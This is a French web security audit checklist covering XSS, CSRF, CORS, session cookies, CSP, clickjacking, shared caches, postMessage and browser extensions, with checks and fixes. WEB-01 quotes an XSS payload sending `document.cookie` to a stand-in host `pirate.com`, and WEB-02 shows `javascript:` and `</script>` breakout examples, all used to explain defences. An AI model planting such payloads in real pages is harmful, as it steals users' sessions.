# 04 · Sécurité côté navigateur (WEB)

Le navigateur fait tourner ton code, mais aussi tout code que quelqu'un parvient à glisser dans ta
page. Sa règle de base, la « same-origin policy » (politique de même origine), cloisonne les sites :
une page de `pirate.com` ne peut pas lire les données de `tonsite.fr`. Deux familles d'attaques
cherchent à la contourner. Le **XSS** : l'attaquant fait exécuter son script à l'intérieur de ta
page, et il a alors tous les pouvoirs de l'utilisateur. Les **requêtes croisées** (CSRF,
clickjacking) : un autre site pousse le navigateur de l'utilisateur à agir chez toi. Les défenses
sont surtout des réglages (échappement à l'affichage, en-têtes, cookies, CSP). Mais tout ce qui se
règle dans le navigateur protège les utilisateurs, pas ton serveur : un script `curl` ignore CORS,
la CSP et `SameSite`. La vraie barrière reste côté serveur (IAM, INJ).

---

### WEB-01 · Aucun HTML venu d'une donnée n'est injecté dans la page sans désinfection
`bloquant` · `web` · `auto`

**Pourquoi** — Le XSS (cross-site scripting) : un commentaire contenant
`<img src=x onerror="fetch('https://pirate.com/?c='+document.cookie)">`, affiché comme du HTML,
s'exécute chez chaque visiteur. Le script peut tout faire au nom de l'utilisateur : lire ses
données, changer son e-mail, publier à sa place. React, Vue, Svelte et Angular échappent le texte
par défaut ; le danger vient des portes de sortie qui insèrent du HTML brut.
**Vérifier** — `node audit.mjs` : `dangerouslySetInnerHTML`, `innerHTML =`, `outerHTML`,
`insertAdjacentHTML`, `document.write`, `v-html` (Vue), `{@html}` (Svelte),
`bypassSecurityTrustHtml` (Angular), `.html(` (jQuery). Apps Script : `<?!= … ?>` dans un modèle
HtmlService n'échappe rien, contrairement à `<?= … ?>`. Shopify Liquid : donnée client affichée
sans filtre. Markdown affiché (commentaires, réponses d'IA) : `marked` ne désinfecte pas ;
`react-markdown` n'affiche pas de HTML brut, sauf avec `rehype-raw`.
**Corriger** — D'abord se demander si le HTML est nécessaire : afficher du texte (`{commentaire}`,
`textContent`) règle le problème. S'il l'est, désinfecter avec DOMPurify, qui retire les scripts,
les attributs `on…` et les liens `javascript:` :
```tsx
import DOMPurify from 'dompurify'          // côté serveur : isomorphic-dompurify
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
```
Markdown : `react-markdown` sans `rehype-raw`, ou avec `rehype-sanitize` si du HTML est voulu.
Liquid, selon les recommandations de Shopify : `{{ x | escape }}` dans le HTML, `{{ x | json }}`
dans un `<script>`, `{{ x | url_encode }}` dans une URL. L'API native `setHTML()` (Sanitizer API)
arrive dans les navigateurs (Firefox 148, Chromium récent) ; tant qu'elle n'est pas partout,
DOMPurify reste la référence.
**Piège** — Désinfecter à l'enregistrement puis faire confiance à la base pour toujours : une
donnée importée, un ancien enregistrement ou une autre application qui écrit dans la table passent
à côté. On désinfecte au moment d'afficher.
**Notions** — XSS, Encodage de sortie, CSP

---

### WEB-02 · Liens, attributs et données glissées dans un `<script>` ne peuvent pas devenir du code
`bloquant` · `web`

**Pourquoi** — L'échappement automatique des frameworks protège le texte, pas tous les contextes.
Un `href` fourni par l'utilisateur peut valoir `javascript:alert(document.cookie)` ; un objet
inséré dans un `<script>` avec `JSON.stringify` peut contenir `</script><script>…` et refermer la
balise ; `location.href = param` ou `iframe.srcdoc = …` exécutent aussi du code.
**Vérifier** — Liens construits avec une donnée (`href={user.site}`, `:href`, `window.open(url)`,
`location = …`) ; `<script>` remplis avec `JSON.stringify` (données de démarrage, JSON-LD pour le
référencement) ; `setAttribute('on…')` ; `srcdoc`.
**Corriger** — Pour une URL d'utilisateur, n'autoriser que `https:` (et `mailto:` au besoin) :
```ts
const lienSur = (u: string) => {
  try { return ['https:', 'mailto:'].includes(new URL(u).protocol) ? u : '#' } catch { return '#' }
}
```
Pour du JSON dans un `<script>` (le JSON-LD dans Next.js par exemple), échapper le `<` comme le
recommande la doc Next.js : `JSON.stringify(donnees).replace(/</g, '\\u003c')`. Jamais d'attribut
d'événement construit à partir d'une donnée.
**Piège** — Compter sur le framework : React 19 bloque les `javascript:` dans `href`, mais pas Vue,
Svelte, le DOM brut, ni les versions plus anciennes de React (qui ne font qu'avertir depuis la
16.9).
**Notions** — XSS, Encodage de sortie

---

### WEB-03 · Le mode debug et les pages d'erreur détaillées sont éteints en production
`bloquant` · `prod` · `auto`

**Pourquoi** — Le mode debug est fait pour ton poste. En ligne, il donne aux visiteurs ce qu'il te
donne : traces d'erreur avec chemins et extraits de code, requêtes SQL, variables d'environnement.
Pire, le débogueur de Flask (`debug=True`, fourni par Werkzeug) ouvre une console Python dans le
navigateur : protégée par un code PIN, elle reste une porte vers l'exécution de code sur le
serveur. Un serveur de développement exposé sur le réseau est aussi fragile : en 2025,
CVE-2025-30208 permettait de lire des fichiers arbitraires via le serveur de dev de Vite lancé
avec `--host`.
**Vérifier** — `node audit.mjs` : `app.run(debug=True)`, `FLASK_DEBUG=1`, `DEBUG = True` (Django),
`FastAPI(debug=True)`, `NODE_ENV` absent ou différent de `production` en prod (Express renvoie
alors la pile d'erreur dans la réponse), `next dev` ou `vite` comme commande de démarrage en prod.
Provoquer une erreur en prod et regarder la réponse. Vérifier que `.git/`, `.env`, `*.bak` et
`*.sql` ne sont pas servis (`curl -I https://tonsite.fr/.git/config` doit répondre 404).
**Corriger** — Debug piloté par l'environnement, éteint par défaut :
```python
app.run(debug=os.environ.get("FLASK_DEBUG") == "1")   # Django : DEBUG = os.environ.get("DJANGO_DEBUG") == "1"
```
Commandes de prod : `next start`, `vite build` puis service des fichiers produits,
`gunicorn`/`uvicorn` sans `--reload`. Un gestionnaire d'erreurs qui renvoie un message générique et
un identifiant d'erreur, le détail allant aux journaux (SEC-11, OBS). Django sans debug :
renseigner `ALLOWED_HOSTS`. Jamais de `--host` sur un serveur de dev dans un réseau public, et Vite
tenu à jour.
**Notions** — Mode debug

---

### WEB-04 · Les cookies de session sont `HttpOnly`, `Secure` et `SameSite=Lax` au minimum
`important` · `comptes` · `auto`

**Pourquoi** — Un cookie de session est la clé du compte tant que la session dure. `HttpOnly`
empêche le JavaScript de la page de le lire : un XSS ne peut plus l'emporter (il peut encore agir
dans la page, mais pas voler la clé). `Secure` l'empêche de voyager en HTTP non chiffré.
`SameSite=Lax` le retire des requêtes envoyées depuis un autre site, sauf la simple navigation par
lien : c'est la première défense contre le CSRF (WEB-07).
**Vérifier** — `node audit.mjs` (`httpOnly: false`). Dans le navigateur : F12 → Application →
Cookies, colonnes HttpOnly, Secure, SameSite. Dans le code : `res.cookie`, `cookies().set`,
`setCookie` (Hono), `express-session` ; en Flask, `SESSION_COOKIE_SECURE` (faux par défaut) et
`SESSION_COOKIE_SAMESITE`.
**Corriger** —
```ts
(await cookies()).set('session', jeton, { httpOnly: true, secure: true, sameSite: 'lax', path: '/', maxAge: 60 * 60 * 24 * 7 })
```
```python
app.config.update(SESSION_COOKIE_SECURE=True, SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SAMESITE="Lax")
```
Le préfixe `__Host-` (`__Host-session`) impose `Secure`, `Path=/` et l'absence de `Domain` : un
sous-domaine compromis ne peut pas écraser le cookie. Pas de `Domain=.tonsite.fr` sans besoin (le
cookie partirait vers tous les sous-domaines). `SameSite=None` seulement pour un vrai besoin
intersite (widget intégré ailleurs), toujours avec `Secure`.
**Piège** — `@supabase/ssr` pose ses cookies de session sans `HttpOnly`, car le client navigateur
doit pouvoir les lire. Le scanner peut le signaler : c'est un choix du SDK, pas une faute à
corriger à la main. La protection repose alors sur l'absence de XSS (WEB-01, WEB-08) et sur des
jetons courts (WEB-09).
**Notions** — Cookies, CSRF

---

### WEB-05 · Les en-têtes de sécurité de base partent avec chaque page
`important` · `web` · `auto`

**Pourquoi** — Quelques en-têtes HTTP activent, pour presque rien, des protections intégrées au
navigateur : n'utiliser que HTTPS, ne pas « deviner » qu'un fichier texte est un script, ne pas
transmettre les adresses complètes aux sites tiers, couper caméra et micro, refuser l'affichage
dans le cadre d'un autre site (WEB-10).
**Vérifier** — `node audit.mjs` (aucune configuration d'en-têtes dans le projet). En ligne :
`curl -I https://tonsite.fr`, l'onglet Réseau du navigateur, ou securityheaders.com.
**Corriger** — La base :
```
Strict-Transport-Security: max-age=63072000; includeSubDomains
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Content-Security-Policy: frame-ancestors 'none'; object-src 'none'; base-uri 'self'
```
| Stack | Où les poser |
|---|---|
| Next.js | `async headers()` dans `next.config` ; la CSP à nonce dans `proxy.ts` (WEB-08) |
| Vercel (tout projet) | clé `headers` de `vercel.json` |
| Cloudflare Pages, Workers (fichiers statiques), Netlify | fichier `_headers` dans le dossier publié ; il ne s'applique pas aux réponses produites par du code, qui posent leurs en-têtes elles-mêmes |
| Express | `app.use(helmet())` |
| Hono | `app.use(secureHeaders())` (`hono/secure-headers`) |
| FastAPI, Flask | un middleware ou un `@app.after_request` qui ajoute les en-têtes |
| Supabase Edge Functions, Workers | en-têtes ajoutés à chaque `Response` |

HSTS (`Strict-Transport-Security`) dit au navigateur de n'utiliser que HTTPS pendant la durée
indiquée ; Vercel le pose déjà par défaut. Pas d'option `preload` sans être sûr que tous les
sous-domaines resteront en HTTPS (NET).
**Piège** — Recopier un vieil `X-XSS-Protection: 1; mode=block` : obsolète, il a même pu créer des
failles ; `helmet` le met à `0`. Et `Cross-Origin-Opener-Policy: same-origin` casse les fenêtres
surgissantes de connexion OAuth ou de paiement : `same-origin-allow-popups` dans ce cas.
**Notions** — Security headers, Clickjacking

---

### WEB-06 · CORS n'autorise que des origines listées, et n'est pas pris pour une protection du serveur
`important` · `api` · `auto`

**Pourquoi** — Par défaut, le navigateur empêche le JavaScript d'un site de lire les réponses d'un
autre site. CORS (Cross-Origin Resource Sharing) sert à **assouplir** cette règle pour des
origines choisies. L'erreur grave : déclarer autorisée l'origine reçue, quelle qu'elle soit, avec
`Access-Control-Allow-Credentials: true`. N'importe quel site lit alors les données de l'utilisateur
connecté par cookie. Les navigateurs refusent `*` combiné aux identifiants, d'où la tentation de
recopier l'origine : c'est pire. Et CORS ne protège pas ton serveur : seuls les navigateurs
l'appliquent ; `curl` ou un autre serveur l'ignorent.
**Vérifier** — `node audit.mjs` (`origin: '*'`, `Access-Control-Allow-Origin: *`, `origin: true`,
origine recopiée depuis la requête). Comparaisons d'origine trop larges
(`origin.endsWith('tonsite.fr')` accepte `pirate-tonsite.fr`), origine `null` acceptée.
**Corriger** — Une liste exacte :
```ts
app.use('/api/*', cors({ origin: ['https://tonsite.fr', 'https://app.tonsite.fr'], credentials: true })) // Hono ; même forme avec le paquet cors d'Express
```
`*` reste acceptable sans cookies : API publique de données ouvertes, ou Edge Function Supabase
appelée avec un jeton dans `Authorization` comme dans les exemples de Supabase (un autre site ne
possède pas le jeton de ta victime). Aucun CORS à configurer si le front et l'API sont sur la même
origine.
**Piège** — Croire qu'une API « protégée par CORS » est privée. L'authentification (IAM), le rate
limiting (API) et la validation (INJ) font ce travail ; CORS règle seulement qui, dans un
navigateur, peut lire la réponse.
**Notions** — CORS, Same-origin policy

---

### WEB-07 · Les actions qui modifient sont protégées contre le CSRF quand l'auth passe par un cookie
`important` · `comptes`

**Pourquoi** — Le CSRF (Cross-Site Request Forgery, falsification de requête intersite) : une page
de `pirate.com` contient un formulaire invisible qui envoie `POST https://tonsite.fr/compte/email`.
Le navigateur y joint tout seul le cookie de session de la victime, et l'action passe à son insu.
Le risque n'existe que si l'auth part **automatiquement**, donc par cookie. Une API qui exige un
en-tête `Authorization: Bearer …` posé par ton JavaScript n'est pas exposée au CSRF classique.
**Vérifier** — L'auth voyage-t-elle par cookie ou par en-tête ? Les cookies ont-ils
`SameSite=Lax` ou `Strict` (WEB-04) ? Des requêtes GET modifient-elles quelque chose (`/logout`,
`/supprimer?id=`) ? Les routes POST, PUT et DELETE authentifiées par cookie vérifient-elles
l'origine ?
**Corriger** — Trois couches simples : `SameSite=Lax` sur les cookies ; aucune modification par
GET ; vérification de l'origine des requêtes qui modifient. Selon la stack : les Server Actions de
Next.js comparent déjà `Origin` et `Host` (ne pas élargir `serverActions.allowedOrigins` sans
raison), mais pas les `route.ts` ; Hono a `csrf()` (`hono/csrf`, qui vérifie `Origin` et
`Sec-Fetch-Site`) ; Flask : `CSRFProtect` de Flask-WTF ; Django : protection intégrée, à ne pas
désactiver. Ailleurs, un contrôle d'origine :
```ts
const site = req.headers.get('sec-fetch-site')     // posé par le navigateur, une page ne peut pas le changer
if (req.method !== 'GET' && site && site !== 'same-origin') return new Response(null, { status: 403 })
```
Un jeton anti-CSRF (double cookie, paquet `csrf-csrf` pour Express) quand l'origine ne suffit pas.
**Piège** — « Mon API n'accepte que du JSON, donc pas de CSRF » : un formulaire peut envoyer en
`text/plain` un corps qui ressemble à du JSON, sans déclencher de contrôle CORS préalable. Vérifier
le `Content-Type` exact, ou l'origine. Et les WebSockets échappent à CORS : vérifier l'en-tête
`Origin` à l'ouverture de la connexion.
**Notions** — CSRF, Cookies, CORS

---

### WEB-08 · Une Content Security Policy limite ce que la page peut exécuter
`important` · `web`

**Pourquoi** — La CSP (Content Security Policy) est un en-tête qui dit au navigateur quels
scripts, styles, images et cadres sont permis. Si un XSS passe malgré tout (WEB-01), une CSP
stricte l'empêche de s'exécuter ou d'envoyer des données ailleurs. C'est la ceinture de sécurité,
pas le frein : elle complète l'échappement, ne le remplace pas.
**Vérifier** — En-tête `Content-Security-Policy` présent ? `'unsafe-inline'` dans `script-src`
(ce qui annule presque tout) ? `object-src 'none'`, `base-uri`, `frame-ancestors` ?
**Corriger** — Commencer par `Content-Security-Policy-Report-Only` (le navigateur signale sans
bloquer) pendant quelques jours, puis passer en blocage. Selon le site :
- **Next.js rendu à la demande** : CSP à nonce (une valeur aléatoire par requête, autorisée dans
  l'en-tête et posée sur chaque script légitime), générée dans `proxy.ts` comme le montre la doc
  Next.js : `script-src 'self' 'nonce-…' 'strict-dynamic'; object-src 'none'; base-uri 'self';
  frame-ancestors 'none'`. Le nonce oblige à rendre toutes les pages à la demande (plus de pages
  statiques ni de cache CDN des pages) ; pour garder le statique, l'option expérimentale
  `experimental.sri` (empreintes des scripts) est l'alternative.
- **Site statique ou SPA Vite** : pas de nonce sans serveur ; `script-src 'self'` plus les domaines
  nécessaires, scripts dans des fichiers et non en ligne (ou autorisés par leur empreinte
  `sha256-…`).

**Piège** — Quand NE PAS viser la CSP parfaite d'entrée : sur un site vitrine chargé de widgets
tiers, une CSP stricte casse tout et finit désactivée. Commencer par
`object-src 'none'; base-uri 'self'; frame-ancestors 'none'; upgrade-insecure-requests`, déjà utile,
puis resserrer.
**Notions** — CSP, XSS, Security headers

---

### WEB-09 · Les jetons de connexion ne sont pas laissés sans raison à portée d'un XSS
`important` · `comptes`

**Pourquoi** — Tout ce qui est rangé dans `localStorage`, `sessionStorage` ou un cookie sans
`HttpOnly` est lisible par n'importe quel script de la page : un XSS, ou un script tiers compromis
(WEB-11). Un jeton de rafraîchissement longue durée volé ainsi donne un accès durable, même après
la correction du XSS.
**Vérifier** — `localStorage.setItem` et `sessionStorage.setItem` de jetons, de clés d'API ou
d'informations personnelles. Durée de vie des jetons gardés côté client.
**Corriger** — Selon le cas :
- **Auth maison ou serveur à soi** : session dans un cookie `HttpOnly` posé par le serveur
  (WEB-04) ; le JavaScript ne voit jamais le jeton.
- **SDK qui garde le jeton côté client** (Supabase, Firebase) : accepter ce choix et compenser par
  des jetons d'accès courts, une CSP (WEB-08), zéro XSS (WEB-01) et peu de scripts tiers. Ne pas
  réécrire l'auth juste pour gagner `HttpOnly`.
- **Jamais côté client** : clés d'API de services tiers (SEC-02), jetons longue durée d'une autre
  application.

**Piège** — Croire qu'un cookie `HttpOnly` rend un XSS inoffensif : le script ne vole plus la clé,
mais il agit toujours dans la page au nom de l'utilisateur. Le cookie limite les dégâts ; seul
WEB-01 évite l'attaque.
**Notions** — Stockage des jetons, XSS, Cookies

---

### WEB-10 · La page refuse d'être affichée dans le cadre d'un autre site, sauf exception voulue
`important` · `web`

**Pourquoi** — Le clickjacking (détournement de clic) : un autre site affiche ta page dans un cadre
(`<iframe>`) transparent, posé sur un faux bouton « Gagner un cadeau ». L'utilisateur, connecté
chez toi, clique en réalité sur « Supprimer mon compte » ou « Autoriser ».
**Vérifier** — `Content-Security-Policy: frame-ancestors …` ou `X-Frame-Options` dans les réponses
HTML. Test : une page locale avec `<iframe src="https://tonsite.fr/compte">` ne doit rien afficher.
**Corriger** — `frame-ancestors 'none'` dans la CSP (ou `'self'` si tu t'affiches toi-même en
cadre), et `X-Frame-Options: DENY` pour les anciens navigateurs ; `helmet` et `secureHeaders`
posent déjà `X-Frame-Options: SAMEORIGIN`. Exceptions voulues : un widget à intégrer chez des
clients liste leurs domaines ; une app Shopify intégrée à l'admin doit envoyer, sur chaque page
HTML, `frame-ancestors https://<boutique>.myshopify.com https://admin.shopify.com` avec la boutique
concernée, sinon Shopify la refuse à la validation.
**Notions** — Clickjacking, Security headers

---

### WEB-11 · Les scripts tiers sont inventoriés, justifiés et chargés de façon sûre
`important` · `web`

**Pourquoi** — Un script chargé depuis un autre domaine (statistiques, chat, publicité,
gestionnaire de balises, CDN) a exactement les pouvoirs de ton code : il lit la page, les champs de
formulaire, les jetons sans `HttpOnly`. Si ce fournisseur est piraté ou racheté, tes visiteurs le
sont aussi. En 2024, le domaine `polyfill.io`, passé à un nouveau propriétaire, a servi du code
malveillant aux nombreux sites qui le chargeaient.
**Vérifier** — Liste des `<script src="https://…">`, des balises ajoutées via Google Tag Manager
(qui permet à d'autres personnes de mettre du code en prod sans passer par le dépôt), des widgets.
Pour chacun : à quoi sert-il, qui le contrôle, est-il chargé sur les pages sensibles (connexion,
paiement, compte) ?
**Corriger** — Retirer ce qui ne sert plus. Héberger soi-même les bibliothèques (`npm install`
plutôt qu'un CDN). Pour un fichier tiers figé et versionné, l'intégrité SRI (Subresource
Integrity : le navigateur refuse le fichier si son empreinte a changé) :
```html
<script src="https://cdn.jsdelivr.net/npm/lib@1.2.3/dist/lib.min.js"
        integrity="sha384-…" crossorigin="anonymous"></script>
```
SRI est impossible pour les scripts qui changent par conception (Stripe.js, Google Tag Manager,
Google Analytics) : les tenir à l'écart des pages sensibles quand c'est possible, et les cadrer
par la CSP (WEB-08). Stripe demande de charger Stripe.js depuis `js.stripe.com`, sans copie
locale. Consentement avant les traceurs : LEG.
**Notions** — Scripts tiers, SRI, CSP

---

### WEB-12 · Les pages et réponses propres à un utilisateur ne sont jamais servies depuis un cache partagé
`important` · `comptes`

**Pourquoi** — Un CDN (Cloudflare, Vercel, Netlify) garde des copies des réponses pour les resservir
à tout le monde. Si la page « Mon compte » ou la réponse de `GET /api/moi` y entre, le visiteur
suivant reçoit les données du précédent. Variante provoquée par un attaquant (« web cache
deception ») : il fait visiter `/compte/style.css` à la victime ; le serveur renvoie la page du
compte, et le CDN la garde parce que l'adresse finit par `.css`.
**Vérifier** — En-têtes `Cache-Control` des réponses personnelles (`curl -I` en étant connecté).
Règles de cache de l'hébergeur (Cloudflare : Cache Rules, option « Cache Everything »). Dans
Next.js : fonctions ou pages mises en cache (`'use cache'`, `unstable_cache`, `revalidate`) dont le
résultat dépend de l'utilisateur.
**Corriger** — Réponses personnelles : `Cache-Control: private, no-store`. Une règle « tout mettre
en cache » exclut les chemins connectés (`/compte`, `/api`, `/admin`) ou contourne le cache quand
un cookie de session est présent. Dans Next.js, une fonction mise en cache dont le résultat dépend
de l'utilisateur reçoit cet utilisateur en argument (les arguments font partie de la clé du cache).
Le serveur répond 404 à une adresse inexistante comme `/compte/style.css` au lieu de renvoyer la
page parente. Le cache au service de la vitesse : PERF.
**Notions** — Cache partagé, Sessions

---

### WEB-13 · `postMessage` : origine vérifiée à la réception, destinataire précis à l'envoi
`important` · `web`

**Pourquoi** — `postMessage` permet à deux fenêtres de sites différents de se parler (iframe
intégrée, fenêtre de connexion OAuth, widget de paiement, extension). Un écouteur qui ne vérifie
pas l'expéditeur obéit à n'importe quel site qui ouvre ta page ; un envoi avec `'*'` livre le
message, jeton compris, à quiconque a pris la place de la fenêtre visée.
**Vérifier** — `addEventListener('message'` sans test de `event.origin` ; `postMessage(…, '*')` ;
contenu reçu utilisé dans `innerHTML`, `eval` ou une navigation.
**Corriger** —
```ts
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://widget.tonsite.fr') return            // égalité stricte, pas includes()
  const msg = Message.safeParse(e.data); if (!msg.success) return  // contenu validé (INJ-01)
  // …
})
cible.postMessage({ type: 'pret' }, 'https://app.tonsite.fr')     // jamais '*' si le message contient une donnée
```
**Notions** — postMessage, Same-origin policy

---

### WEB-14 · Extension de navigateur : Manifest V3, permissions minimales, aucun code distant
`important` · `web`

**Pourquoi** — Une extension peut lire et modifier les pages visitées : avec `<all_urls>`, c'est
toute la navigation de l'utilisateur, banque comprise. Chaque permission en trop agrandit les
dégâts si l'extension est compromise (compte développeur volé, dépendance piégée, extension
rachetée) et fait fuir à l'installation. Chrome a cessé d'exécuter les extensions Manifest V2 en
2025 (Chrome 138, puis 139 pour les entreprises) ; Manifest V3 interdit en plus le code chargé à
distance. Firefox accepte encore MV2, mais MV3 fonctionne sur les deux.
**Vérifier** — `manifest.json` : `manifest_version`, `permissions`, `host_permissions`,
`content_scripts.matches`, `web_accessible_resources`, `externally_connectable`,
`content_security_policy`. Code chargé depuis une URL (`<script src="https://…">` dans la popup,
`eval`, texte récupéré par `fetch` puis exécuté).
**Corriger** —
```json
{
  "manifest_version": 3,
  "permissions": ["storage", "activeTab"],
  "optional_host_permissions": ["https://*.notion.so/*"],
  "content_scripts": [{ "matches": ["https://www.youtube.com/*"], "js": ["content.js"] }]
}
```
`activeTab` donne accès à l'onglet courant seulement quand l'utilisateur clique sur l'extension ;
`optional_host_permissions` et `chrome.permissions.request()` demandent un site au moment où on en a
besoin. `<all_urls>` seulement si la fonction l'exige (bloqueur, traducteur), justifié dans la
fiche du store. Tout le code est dans le paquet ; une configuration distante reste de la donnée,
jamais du code. MFA sur le compte développeur (IAM-15).
**Piège** — Mettre une clé d'API dans l'extension : le paquet se décompresse en une minute. Même
règle que pour le navigateur (SEC-02) : un serveur relais garde la clé.
**Notions** — Extensions de navigateur, Principe du moindre privilège

---

### WEB-15 · Extension de navigateur : pages visitées et messages reçus sont traités comme hostiles
`important` · `web`

**Pourquoi** — Un content script (le script que l'extension injecte dans les pages) lit du contenu
écrit par n'importe qui : titre d'une vidéo, message, page piégée. Ce contenu inséré en `innerHTML`
dans la popup ou le panneau latéral devient un XSS **dans l'extension**, avec toutes ses
permissions. Et un service worker (le cœur de l'extension) qui exécute tout ce que demandent les
messages reçus peut être piloté par une page malveillante.
**Vérifier** — `chrome.runtime.onMessage` et `onMessageExternal` : expéditeur vérifié, message
validé ? `externally_connectable` présent et restreint ? `innerHTML` avec des données venues d'une
page ? Secrets rangés dans `chrome.storage` ?
**Corriger** — Dans le service worker : vérifier `sender.id === chrome.runtime.id` (et
`sender.origin` pour les messages externes), valider le contenu (INJ-01), n'accepter qu'une liste
fermée d'actions. `externally_connectable` limité aux domaines prévus. Affichage en `textContent`,
ou DOMPurify (WEB-01). Rien de secret dans `chrome.storage.local`, lisible sur l'ordinateur ;
`chrome.storage.session` reste en mémoire.
**Notions** — Extensions de navigateur, XSS, postMessage

---

### WEB-16 · Aucune source map publique en production
`conseillé` · `prod` · `auto`

**Pourquoi** — Une source map relie le JavaScript compressé au code d'origine, noms et commentaires
compris. Publique, elle livre ton code source lisible : routes internes, logique métier,
commentaires (« TODO : vérifier les droits ici »), parfois des valeurs oubliées. Ce n'est pas une
faille en soi, puisque le JavaScript du navigateur est lisible de toute façon, mais elle fait
gagner beaucoup de temps à qui cherche une faille.
**Vérifier** — `node audit.mjs` (`build.sourcemap: true` dans `vite.config`,
`productionBrowserSourceMaps: true` dans `next.config`, `devtool: 'source-map'` dans webpack,
Create React App sans `GENERATE_SOURCEMAP=false`). En ligne : fichiers `.map` accessibles,
commentaire `//# sourceMappingURL=` à la fin des bundles.
**Corriger** — `sourcemap: false` (le défaut de Vite). Si un outil de suivi d'erreurs (Sentry) en a
besoin : `sourcemap: 'hidden'`, envoi des `.map` à l'outil, puis suppression avant déploiement
(option `sourcemaps.filesToDeleteAfterUpload` du plugin Sentry).
**Piège** — Un secret trouvé dans une source map était déjà dans le bundle : la retirer ne suffit
pas, il faut SEC-02 et SEC-06.
**Notions** — Source maps

---

### WEB-17 · Aucun contenu mixte : tout ce que charge la page passe en HTTPS
`conseillé` · `web`

**Pourquoi** — Le contenu mixte, c'est une page HTTPS qui charge quelque chose en HTTP. Ce morceau
voyage en clair et peut être modifié en route (Wi-Fi public). Les navigateurs bloquent déjà les
scripts et les cadres en HTTP et passent les images en HTTPS quand ils le peuvent : le résultat
habituel est une fonction cassée en prod, ou un avertissement de sécurité.
**Vérifier** — Console du navigateur (messages « Mixed Content ») ; `http://` dans le code, les
modèles, les contenus en base (images de produits Shopify, liens d'articles), les URL d'API en
configuration.
**Corriger** — URL en `https://` ou relatives partout ; directive CSP `upgrade-insecure-requests`
en filet. HTTPS du site lui-même, certificats et HSTS : NET.
**Notions** — Mixed content

---

### WEB-18 · Le HTML fourni par des utilisateurs s'affiche isolé : autre domaine ou iframe `sandbox`
`conseillé` · `fichiers`

**Pourquoi** — Certaines fonctions doivent afficher du HTML entier d'origine inconnue : aperçu d'un
e-mail reçu, page créée par un utilisateur, fichier HTML ou SVG envoyé, page générée par une IA. La
désinfection (WEB-01) ne convient plus quand il faut garder ce HTML tel quel. Servi depuis ton
domaine, ce contenu a accès à tes cookies et à tes API.
**Vérifier** — Où s'affichent les contenus HTML ou SVG d'utilisateurs, et depuis quel domaine
sont-ils servis ?
**Corriger** — Les servir depuis un nom de domaine **séparé** (Google le fait avec
`googleusercontent.com`) : bucket de stockage, ou domaine dédié, pas un simple sous-domaine du
tien. Pour un aperçu dans la page : `<iframe sandbox srcdoc="…">` sans `allow-same-origin` ; ajouter
`allow-scripts` seulement si le contenu doit vraiment s'exécuter, et jamais avec
`allow-same-origin` en même temps. Sinon, `Content-Disposition: attachment` pour forcer le
téléchargement (INJ-07).
**Notions** — XSS, Upload de fichiers, Same-origin policy

---

### WEB-19 · Trusted Types et collecte des rapports CSP : pour les grosses interfaces et les équipes
`conseillé` · `échelle`

**Pourquoi** — Trusted Types est une option de la CSP (`require-trusted-types-for 'script'`) qui
fait refuser par le navigateur toute affectation de texte brut à `innerHTML` et aux autres points
d'insertion de HTML : seul passe un contenu produit par une fonction de désinfection déclarée.
C'est la façon de garantir, sur des centaines de composants et plusieurs développeurs, qu'aucun
`innerHTML` n'échappe à la revue ; la fonction est disponible dans les principaux navigateurs
depuis 2026. La collecte des rapports CSP (`report-to`) dit en continu ce que la politique bloque.
**Vérifier** — L'interface est-elle grande, avec plusieurs contributeurs et beaucoup de
bibliothèques ? Un service reçoit-il les rapports de violation CSP ?
**Corriger** — Projet personnel ou petite équipe : WEB-01, WEB-08 et le scanner suffisent.
À partir de plusieurs équipes sur la même interface, ou d'une app à fort enjeu : Trusted Types
d'abord en `Report-Only`, une politique par défaut qui passe par DOMPurify, puis blocage ; rapports
CSP envoyés à l'outil de suivi d'erreurs (Sentry les accepte) et relus.
**Notions** — CSP, XSS
